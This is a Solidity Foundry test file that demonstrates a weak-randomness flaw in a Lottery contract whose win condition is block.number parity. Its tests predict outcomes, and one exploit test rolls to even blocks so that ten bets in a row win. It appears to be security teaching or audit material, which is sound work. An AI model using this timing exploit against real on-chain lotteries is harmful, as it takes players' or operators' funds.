pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Lottery} from "../src/Lottery.sol";

contract TestWeakRandomnessLottery is Test {

    Lottery private lottery;
    address private attacker;

    function setUp() public {
        lottery = new Lottery();
        attacker = address(this);
        vm.deal(address(lottery), 10 ether);
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint256).max - 1000);

        vm.roll(blockNumber);

        uint256 balanceBefore = attacker.balance;

        bool predictedWin = (block.number % 2) == 0;

        uint256 betAmount = 1 ether;
        lottery.makeBet{value: betAmount}();

        uint256 balanceAfter = attacker.balance;

        if (predictedWin) {
            assertEq(balanceAfter, balanceBefore, "Should have received bet back on win");
        } else {
            assertEq(balanceAfter, balanceBefore - betAmount, "Should have lost bet amount on loss");
        }
    }

    function test_exploitPredictableRandomness() public {
        uint256 initialBalance = attacker.balance;
        uint256 betAmount = 1 ether;
        uint256 successfulBets = 0;

        for (uint256 i = 0; i < 10; i++) {
            uint256 targetBlock = (block.number % 2 == 0) ? block.number : block.number + 1;
            vm.roll(targetBlock);

            bool predictedWin = (block.number % 2) == 0;
            assertTrue(predictedWin, "Should always predict a win when choosing even block");

            uint256 balanceBefore = attacker.balance;
            lottery.makeBet{value: betAmount}();
            uint256 balanceAfter = attacker.balance;

            assertEq(balanceAfter, balanceBefore, "Should always get bet back when predicting correctly");
            successfulBets++;

            vm.roll(block.number + 2);
        }

        assertEq(successfulBets, 10, "All bets should be successful when exploiting predictability");
        assertEq(attacker.balance, initialBalance, "Balance should remain unchanged after winning all bets");
    }

    function test_correlationCheckSameBlock(uint256 blockNumber) public {
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint256).max - 1000);

        vm.roll(blockNumber);

        bool predictedResult1 = (block.number % 2) == 0;
        bool predictedResult2 = (block.number % 2) == 0;

        assertEq(predictedResult1, predictedResult2, "Same block should produce same result");

        uint256 balance1Before = attacker.balance;
        lottery.makeBet{value: 0.1 ether}();
        uint256 balance1After = attacker.balance;

        uint256 balance2Before = balance1After;
        lottery.makeBet{value: 0.1 ether}();
        uint256 balance2After = attacker.balance;

        bool actualWin1 = (balance1After == balance1Before);
        bool actualWin2 = (balance2After == balance2Before);

        assertEq(actualWin1, actualWin2, "Multiple bets in same block should have same outcome");
        assertEq(actualWin1, predictedResult1, "Actual outcome should match predicted outcome");
    }

    receive() external payable {}
}
